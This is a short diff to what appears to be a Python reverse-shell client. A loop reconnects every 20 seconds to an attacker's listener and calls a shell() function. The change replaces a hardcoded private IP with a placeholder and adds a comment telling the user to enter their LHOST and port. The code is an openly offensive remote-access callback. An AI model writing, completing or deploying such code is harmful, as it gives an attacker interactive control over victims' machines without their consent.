@@ -29,7 +29,10 @@ def connection():
     while True:
         time.sleep(20)
         try:
-            so.connect(('192.168.0.21', 5555))
+            # **************************************************************************
+            # ***** v ENTER LOCAL HOST (LHOST) IP & LISTENING PORT (LPORT) HERE! v *****
+            # **************************************************************************
+            so.connect(('<ENTER LHOST IP HERE>', 5555))
             shell()
             so.close()
             break
